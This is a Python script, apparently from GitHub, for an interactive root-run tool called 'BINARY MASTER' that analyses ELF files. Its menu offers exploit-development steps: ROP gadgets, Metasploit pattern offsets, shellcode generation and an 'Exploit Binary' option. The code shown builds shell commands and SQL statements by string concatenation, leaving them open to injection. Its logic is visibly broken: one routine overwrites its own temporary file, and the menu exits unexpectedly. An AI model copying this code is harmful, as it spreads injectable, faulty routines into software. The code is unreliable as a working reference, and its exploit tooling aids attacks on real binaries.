#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#              PYTHON3 SCRIPT FILE FOR THE LOCAL ANALYSIS OF ELF FILES
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import r2pipe
import sqlite3
import pyfiglet
import linecache
import webbrowser

from termcolor import colored

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : Create functional subroutines called from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def bulkAddress(variable):
   bulked = variable
   if DATA[5][:1] == "u":
      DATA[5] = spacePadding("64", COL1)
      print("[+] Defualting to 64 bits...")

   if DATA[5][:2] == "64":
      if (len(variable) == 8) and (variable[:2] != "0x"):
         bulked = "0x00000000" + variable
      if (len(variable) == 7) and (variable[:2] != "0x"):
         bulked = "0x00000000" + "0" + variable      
      if (len(variable) == 6) and (variable[:2] != "0x"):
         bulked = "0x00000000" + "00" + variable
      if (len(variable) == 5) and (variable[:2] != "0x"):
         bulked = "0x00000000" + "000" + variable      
      if (len(variable) == 4) and (variable[:2] != "0x"):
         bulked = "0x00000000" + "0000" + variable
      if (len(variable) == 3) and (variable[:2] != "0x"):
         bulked = "0x00000000" + "00000" + variable
      if (len(variable) == 2) and (variable[:2] != "0x"):
         bulked = "0x00000000" + "000000" + variable      
      return bulked
   else:
      print("Function bulkAddress needs amending for 32 bit...")
      exit(1)

def cutLine(variable1, variable2):
   command("sed -i '/" + variable1 + "/d' ./" + variable2)
   return
   
def parsFile(variable):
   command("sed -i '/^$/d' ./" + variable)
   return      
      
def lineCount(variable):
   command("cat " + variable + " | wc -l > counter.tmp")
   with open("counter.tmp","r") as counter:
      count = counter.readline()
   return int(count)

def spacePadding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value]
   while len(variable) < value:
      variable += " "
   return variable  
     
def command(variable):
   if bugHunt == 1:
      print(colored(variable, colour5))
   os.system(variable)
   return 
 
def prompt():
   null = input("\nPress ENTER to continue...")
   return   
   
def catsFile(variable):
   counter = lineCount(variable)
   if counter > 0:
      command("echo '" + Green + "'")
      command("cat " + variable)
      command("echo '" + Reset + "'")
   return   
   
def clearClutter():
   command("rm *.tmp")
   linecache.clearcache()
   return
   
def dispBanner(variable,flash):
   ascii_banner = pyfiglet.figlet_format(variable).upper()
   ascii_banner = ascii_banner.rstrip("\n")
   if flash == 1:
      command("clear")
      print(colored(ascii_banner,colour0, attrs=['bold']))
   command("pyfiglet " + variable + " > banner.tmp")
   return
   
def saveParams():
   command("echo '" + REG1_0 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' > base64.tmp")
   command("echo '" + REG1_1 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG1_2 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG1_3 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG1_4 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG1_5 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG1_6 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG1_7 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG1_8 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG1_9 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG1_10 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG1_11 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_0 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_1 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_2 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_3 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_4 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_5 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_6 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_7 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_8 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_9 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_10 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + REG2_11 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_0 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_1 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_2 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_3 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_4 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_5 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_6 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_7 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_8 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_9 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_10 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + DATA_11 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_0 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_1 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_2 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_3 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_4 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_5 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_6 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_7 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_8 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_9 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_10 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   command("echo '" + CSEC_11 + "' | base64 --wrap=0 >  base64.tmp"); command("echo '\n' >> base64.tmp")
   
   parsFile("base64.tmp")
   
   REG1_0_2 = linecache.getline("base64.tmp", 1).rstrip("\n") 
   REG1_1_2 = linecache.getline("base64.tmp", 2).rstrip("\n") 
   REG1_2_2 = linecache.getline("base64.tmp", 3).rstrip("\n") 
   REG1_3_2 = linecache.getline("base64.tmp", 4).rstrip("\n")    
   REG1_4_2 = linecache.getline("base64.tmp", 5).rstrip("\n")
   REG1_5_2 = linecache.getline("base64.tmp", 6).rstrip("\n")     
   REG1_6_2 = linecache.getline("base64.tmp", 7).rstrip("\n") 
   REG1_7_2 = linecache.getline("base64.tmp", 8).rstrip("\n") 
   REG1_8_2 = linecache.getline("base64.tmp", 9).rstrip("\n") 
   REG1_9_2 = linecache.getline("base64.tmp", 10).rstrip("\n")    
   REG1_10_2 = linecache.getline("base64.tmp", 11).rstrip("\n")   
   REG1_11_2 = linecache.getline("base64.tmp", 12).rstrip("\n")   
   REG2_0_2 = linecache.getline("base64.tmp", 13).rstrip("\n") 
   REG2_1_2 = linecache.getline("base64.tmp", 14).rstrip("\n") 
   REG2_2_2 = linecache.getline("base64.tmp", 15).rstrip("\n") 
   REG2_3_2 = linecache.getline("base64.tmp", 16).rstrip("\n")    
   REG2_4_2 = linecache.getline("base64.tmp", 17).rstrip("\n")
   REG2_5_2 = linecache.getline("base64.tmp", 18).rstrip("\n")     
   REG2_6_2 = linecache.getline("base64.tmp", 19).rstrip("\n") 
   REG2_7_2 = linecache.getline("base64.tmp", 20).rstrip("\n") 
   REG2_8_2 = linecache.getline("base64.tmp", 21).rstrip("\n") 
   REG2_9_2 = linecache.getline("base64.tmp", 22).rstrip("\n")    
   REG2_10_2 = linecache.getline("base64.tmp", 23).rstrip("\n")   
   REG2_11_2 = linecache.getline("base64.tmp", 24).rstrip("\n")   
   DATA_0_2 = linecache.getline("base64.tmp", 25).rstrip("\n") 
   DATA_1_2 = linecache.getline("base64.tmp", 26).rstrip("\n") 
   DATA_2_2 = linecache.getline("base64.tmp", 27).rstrip("\n") 
   DATA_3_2 = linecache.getline("base64.tmp", 28).rstrip("\n")    
   DATA_4_2 = linecache.getline("base64.tmp", 29).rstrip("\n")
   DATA_5_2 = linecache.getline("base64.tmp", 30).rstrip("\n")     
   DATA_6_2 = linecache.getline("base64.tmp", 31).rstrip("\n") 
   DATA_7_2 = linecache.getline("base64.tmp", 32).rstrip("\n") 
   DATA_8_2 = linecache.getline("base64.tmp", 33).rstrip("\n") 
   DATA_9_2 = linecache.getline("base64.tmp", 34).rstrip("\n")    
   DATA_10_2 = linecache.getline("base64.tmp", 35).rstrip("\n")   
   DATA_11_2 = linecache.getline("base64.tmp", 36).rstrip("\n")   
   CSEC_0_2 = linecache.getline("base64.tmp", 37).rstrip("\n") 
   CSEC_1_2 = linecache.getline("base64.tmp", 38).rstrip("\n") 
   CSEC_2_2 = linecache.getline("base64.tmp", 39).rstrip("\n") 
   CSEC_3_2 = linecache.getline("base64.tmp", 40).rstrip("\n")    
   CSEC_4_2 = linecache.getline("base64.tmp", 41).rstrip("\n")
   CSEC_5_2 = linecache.getline("base64.tmp", 42).rstrip("\n")     
   CSEC_6_2 = linecache.getline("base64.tmp", 43).rstrip("\n") 
   CSEC_7_2 = linecache.getline("base64.tmp", 44).rstrip("\n") 
   CSEC_8_2 = linecache.getline("base64.tmp", 45).rstrip("\n") 
   CSEC_9_2 = linecache.getline("base64.tmp", 46).rstrip("\n")    
   CSEC_10_2 = linecache.getline("base64.tmp", 47).rstrip("\n")   
   CSEC_11_2 = linecache.getline("base64.tmp", 48).rstrip("\n")   
        
   cursor.execute("UPDATE REMOTETARGET SET REG1_0 = \"" + REG1_0_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG1_1 = \"" + REG1_1_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG1_2 = \"" + REG1_2_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG1_3 = \"" + REG1_3_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG1_4 = \"" + REG1_4_2 + "\" WHERE IDS = 1"); connection.commit()   
   cursor.execute("UPDATE REMOTETARGET SET REG1_5 = \"" + REG1_5_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG1_6 = \"" + REG1_6_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG1_7 = \"" + REG1_7_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG1_8 = \"" + REG1_8_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG1_9 = \"" + REG1_9_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG1_10 = \"" + REG1_10_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG1_11 = \"" + REG1_11_2 + "\" WHERE IDS = 1"); connection.commit()   
   cursor.execute("UPDATE REMOTETARGET SET REG2_0 = \"" + REG2_0_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG2_1 = \"" + REG2_1_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG2_2 = \"" + REG2_2_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG2_3 = \"" + REG2_3_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG2_4 = \"" + REG2_4_2 + "\" WHERE IDS = 1"); connection.commit()   
   cursor.execute("UPDATE REMOTETARGET SET REG2_5 = \"" + REG2_5_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG2_6 = \"" + REG2_6_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG2_7 = \"" + REG2_7_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG2_8 = \"" + REG2_8_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG2_9 = \"" + REG2_9_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG2_10 = \"" + REG2_10_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET REG2_11 = \"" + REG2_11_2 + "\" WHERE IDS = 1"); connection.commit()   
   cursor.execute("UPDATE REMOTETARGET SET DATA_0 = \"" + DATA_0_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DATA_1 = \"" + DATA_1_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DATA_2 = \"" + DATA_2_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DATA_3 = \"" + DATA_3_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DATA_4 = \"" + DATA_4_2 + "\" WHERE IDS = 1"); connection.commit()   
   cursor.execute("UPDATE REMOTETARGET SET DATA_5 = \"" + DATA_5_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DATA_6 = \"" + DATA_6_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DATA_7 = \"" + DATA_7_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DATA_8 = \"" + DATA_8_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DATA_9 = \"" + DATA_9_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DATA_10 = \"" + DATA_10_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET DATA_11 = \"" + DATA_11_2 + "\" WHERE IDS = 1"); connection.commit()   
   cursor.execute("UPDATE REMOTETARGET SET CSEC_0 = \"" + CSEC_0_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CSEC_1 = \"" + CSEC_1_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CSEC_2 = \"" + CSEC_2_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CSEC_3 = \"" + CSEC_3_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CSEC_4 = \"" + CSEC_4_2 + "\" WHERE IDS = 1"); connection.commit()   
   cursor.execute("UPDATE REMOTETARGET SET CSEC_5 = \"" + CSEC_5_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CSEC_6 = \"" + CSEC_6_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CSEC_7 = \"" + CSEC_7_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CSEC_8 = \"" + CSEC_8_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CSEC_9 = \"" + CSEC_9_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CSEC_10 = \"" + CSEC_10_2 + "\" WHERE IDS = 1"); connection.commit()
   cursor.execute("UPDATE REMOTETARGET SET CSEC_11 = \"" + CSEC_11_2 + "\" WHERE IDS = 1"); connection.commit()
   return     

def dispMenu():
   print('\u2554' + ('\u2550')*37 + '\u2566' + ('\u2550')*36 + '\u2566' + ('\u2550')*28 + '\u2566' + ('\u2550')*18 + '\u2566' + ('\u2550')*38 + '\u2557')
   print('\u2551' + " REGISTER SET TWO " + (" ")*19 + '\u2551' + " REGISTER SET ONE " + (" ")*18 + '\u2551' + " FILE INFORMATION " + (" ")*10 + '\u2551' + " CHECKSEC DATA    " + '\u2551' + " OFFSET              FUNCTIONS        " + '\u2551')
   print('\u2560' + ('\u2550')*16 + '\u2566' + ('\u2550')*20 + '\u256C' + ('\u2550')*15 + '\u2566' + ('\u2550')*20 + '\u256C' + ('\u2550')*28 + '\u256C' + ('\u2550')*18 + '\u256C' +  ('\u2550')*38 + '\u2563')   
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   for x in range(0,12):
      if (x in range(1, 8)) and (REG2[x] == "0x0000000000000000"):
         print('\u2551' + colored(HED1[x][:16],colour2) + '\u2551', end=' ')
      else:
         print('\u2551' + HED1[x][:16] + '\u2551', end=' ')         
      if REG2[x] == "0x0000000000000000":
         print(colored(REG2[x],colour7), end=' ')
      else:
         if (x in range(1,8)) and (CSEC[6][:1] != "0"):
            print(colored(REG2[x],colour3), end=' ')            
         else:
            print(colored(REG2[x],colour6), end=' ')      
      if (x in range(0,9)) and (REG1[x] == "0x0000000000000000"):
         if "<============" in HED2[x]:
            print('\u2551' + colored(HED2[x][:15], colour3) + '\u2551', end=' ')
         else:
            print('\u2551' + colored(HED2[x][:15], colour2) + '\u2551', end=' ')
      else:   
         print('\u2551' + HED2[x][:15] + '\u2551', end=' ')         
      if (CSEC[6][:1] != "0") and (x == 8):
         print(colored(REG1[x],colour3), end=' ')
      elif REG1[x] == "0x0000000000000000":
         print(colored(REG1[x],colour7), end=' ')
      else:
         print(colored(REG1[x],colour6), end=' ')
      print('\u2551', end=' ')      
      if (HED3[x][:1] == "<") and (CSEC[6][:1] != "0"):
         print(colored(HED3[x],colour3), end=' ')      
      else:
         print(HED3[x], end=' ')                  
      if (x == 8) and (DATA[x][:1] == "=") and (CSEC[6][:1] != "0"):
         print(colored(DATA[x][:18],colour3), end=' ')
      elif x == 8:
         print(DATA[x][:18], end=' ')         
      if (x != 8) and ((DATA[x][:7] == "unknown" or DATA[x][:1] == "0")):
         print(colored(DATA[x][:18],colour7), end=' ')
      elif x != 8:
         print(colored(DATA[x][:18],colour6), end=' ')
      print('\u2551', end=' ')      
      if (HED4[x][:1] == "=") and (CSEC[6][:1] != "0"):
         print(colored(HED4[x],colour3), end=' ')
      else:
         print(HED4[x], end=' ')                           
      if (CSEC[x][:7] == "unknown") or (CSEC[x][:1] == "0"):
         print(colored(CSEC[x][:8],colour7), end=' ')
      elif (x > 5) and CSEC[6][:1] != "0":
         print(colored(CSEC[x][:8],colour3), end=' ')     
      elif CSEC[x][:8] == "Disabled":
         print(colored(CSEC[x][:8],colour0), end=' ')
      else:
         print(colored(CSEC[x][:8],colour6), end=' ')      
      print('\u2551', end=' ')
      if "main" in FUNC[x]:
         exit()
         print(colored(FUNC[x],colour3), end=' ')
      else:
         print(colored(FUNC[x],colour6), end=' ')
      print('\u2551')	
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2560' + ('\u2550')*16 + '\u2569' + ('\u2550')*20 + '\u2569' + ('\u2550')*15 + '\u2569' + ('\u2550')*20 + '\u2569' + ('\u2550')*28 + '\u2569' + ('\u2550')*18 + '\u2563', end=' ')
   if "main" in FUNC[12]:
      print(colored(FUNC[12],colour3), end=' ')
   else:
      print(colored(FUNC[12],colour6), end=' ')     
   print('\u2551')    
   return
   
def options():
   print('\u2551' + "(01) ACCUMULATOR  (11) START  ADDRESS (21) PUTS@PLT ADDRESS (31) ExtractGadgets (41) MSF PatternCreate (51) Hexcode Editor" + '\u2551',end=' ')
   if "main" in FUNC[13]:
      print(colored(FUNC[13],colour3), end=' ')
   else:
      print(colored(FUNC[13],colour6), end=' ')     
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(02) BASE         (12) MAIN   ADDRESS (22) PUTS@GOT ADDRESS (32) Read  PrivHead (42) Program Interface (52) SecComp   Dump" + '\u2551',end=' ')
   if "main" in FUNC[14]:
      print(colored(FUNC[14],colour3), end=' ')
   else:
      print(colored(FUNC[14],colour6), end=' ')     
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(03) COUNTER      (13) SYSTEM ADDRESS (23) POP RDI  ADDRESS (33) Read  Sections (43) L-Trace Interface (53) Use ShellCraft" + '\u2551',end=' ')
   if "main" in FUNC[15]:
      print(colored(FUNC[15],colour3), end=' ')
   else:
      print(colored(FUNC[15],colour6), end=' ')     
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- - 
   print('\u2551' + "(04) DATA         (14) FUNCTION  ADDR (24) LIBC     ADDRESS (34) Read   Headers (44) G.D.B.  Interface (54) NASM Shellcode" + '\u2551', end=' ')
   if "main" in FUNC[16]:
      print(colored(FUNC[16],colour3), end=' ')
   else:
      print(colored(FUNC[16],colour6), end=' ')
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(05) SOURCE INDEX (15) OVERWRITE ADDR (25) Select  FILENAME (35) ReadExecutable (45) MSF PatternSearch (55) MSF  Shellcode" + '\u2551',end=' ')
   if "main" in FUNC[17]:
      print(colored(FUNC[17],colour3), end=' ')
   else:
      print(colored(FUNC[17],colour6), end=' ')     
   print('\u2551')
   # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- - 
   print('\u2551' + "(06) DESTIN INDEX (16) MEMORY    ADDR (26) Switch File Mode (36) Read DeBugInfo (46) Set Buffer OFFSET (56) RESERVED      " + '\u2551',end=' ')
   if "main" in FUNC[18]:
      print(colored(FUNC[18],colour3), end=' ')
   else:
      print(colored(FUNC[18],colour6), end=' ')     
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(07) STACKPOINTER (17) POINTER   ADDR (27) Examine  Program (37) Read Assembley (47) Adjust the OFFSET (57) Set IP &  Port" + '\u2551',end=' ')
   if "main" in FUNC[19]:
      print(colored(FUNC[19],colour3), end=' ')
   else:
      print(colored(FUNC[19],colour6), end=' ')     
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(08) BASE POINTER (18) CUSTOM-1  ADDR (28) CheckSec Program (38) Read   Symbols (48) Dis-Assemble MAIN (58) Exploit Binary" + '\u2551',end=' ')
   if "main" in FUNC[20]:
      print(colored(FUNC[20],colour3), end=' ')
   else:
      print(colored(FUNC[20],colour6), end=' ')     
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
   print('\u2551' + "(09) INST POINTER (19) CUSTOM-2  ADDR (29) G.D.B. Functions (39) Read Stab Data (49) Dis-Assemble FUNC (59) Read OP Manual" + '\u2551',end=' ')
   if "main" in FUNC[21]:
      print(colored(FUNC[21],colour3), end=' ')
   else:
      print(colored(FUNC[21],colour6), end=' ')     
   print('\u2551')
# -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -     
   print('\u2551' + "(10) PIE  ADDRESS (20) CUSTOM-3  ADDR (30) Radar2 Functions (40) Read HexFormat (50) Dis-Assemble ADDR (60) Exit Program  " + '\u2551',end=' ')
   if FUNC[23] != "":
      print(colored(FUNC[22],colour0), end=' ');print('\u2551')    
   elif "main" in FUNC[22]:
      print(colored(FUNC[22],colour3), end=' ');print('\u2551')      
   else:
      print(colored(FUNC[22],colour6), end=' ');print('\u2551')    
   print('\u255A' + ('\u2550')*122 + '\u2569' +  ('\u2550')*38 + '\u255D')
   return

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : START OF MAN - Check running as root.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
   print("\n[*] Please run this python3 script as root...")
   exit(1)
else:
   bugHunt = 0  
    
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : Create local user-friendly variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

localDir = "BINARY-MASTER"
flavour = "intel"

colour0 = "red"
colour1 = "grey"
colour2 = "cyan"
colour3 = "blue"
colour4 = "black"
colour5 = "white"
colour6 = "green"
colour7 = "yellow"
colour8 = "magenta"

Yellow  = '\e[1;93m'
Green   = '\e[0;32m'
Red     = '\e[1;91m'
Reset   = '\e[0m'
      
# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : FULL STACK
# Details : Display program banner and boot system.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

command("xdotool key Alt+Shift+S; xdotool type 'BINARY MASTER'; xdotool key Return")
dispBanner("BINARY MASTER",1)
print(colored("\t\t    F U L L  S T A C K  E D I T I O N",colour7,attrs=['bold']))
print(colored("\n\n[*] Booting, please wait...", colour3))

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : FULL STACK
# Details : Initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.path.exists(localDir):
   print("[+] Directory " + localDir + " already exists...")
else:
   print("[+] Creating directory " + localDir + "...")
   command("mkdir " + localDir)
  
if os.path.exists(localDir + "/RA.db"):
   pass
else:
   print("[+] Creatng new database...")
   try:
      command("cp RA.db ./" + localDir + "/RA.db")
      print("[+] Copying database...")
   except:
      print(colored("[!] WARNING!!! - RA.db missing, unable to create new database...", colour0))

if os.path.exists(localDir + "/RA.db"):
   print("[+] Connecting to database...")
   connection = sqlite3.connect(localDir + "/RA.db")
   cursor = connection.cursor()
else:
   print(colored("[!] WARNING!!! - " + localDir + "/RA.db missing, unable to connect to database...", colour0))
   exit(1)
                  
print("[+] Populating system variables...")

maxDispl = 25

COL1 = 18
COL2 = 45
COL3 = 36
LEN1 = 0

# NEW VARIABLES THAT NEED TO BE ADDED TO THE DATABSE

HED1 = ["                  "]*maxDispl
REG1 = ["0x0000000000000000"]*maxDispl
HED2 = ["                  "]*maxDispl
REG2 = ["0x0000000000000000"]*maxDispl
HED3 = ["       "]*maxDispl
DATA = [" "*COL1]*maxDispl
HED4 = ["       "]*maxDispl
CSEC = [" "*COL1]*maxDispl
FUNC = [" "*COL3]*maxDispl
GRAD = [" "*COL2]*maxDispl
   
HED1[0]  = spacePadding(" SYSTEM ADDRESS ", COL1+2)   
HED1[1]  = spacePadding(" FUNCTION  ADDR ", COL1+2)   
HED1[2]  = spacePadding(" OVERWRITE ADDR ", COL1+2)   
HED1[3]  = spacePadding(" MEMORY    ADDR ", COL1+2)   
HED1[4]  = spacePadding(" POINTER   ADDR ", COL1+2)   
HED1[5]  = spacePadding(" CUSTOM-1  ADDR ", COL1+2)   
HED1[6]  = spacePadding(" CUSTOM-2  ADDR ", COL1+2)   
HED1[7]  = spacePadding(" CUSTOM-3  ADDR ", COL1+2)   
